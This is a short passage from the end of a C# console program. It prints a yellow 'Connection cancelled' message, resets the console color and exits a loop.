                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n⊗ Connection cancelled\n");
                Console.ResetColor();
                break;
            }
        }
    }
}
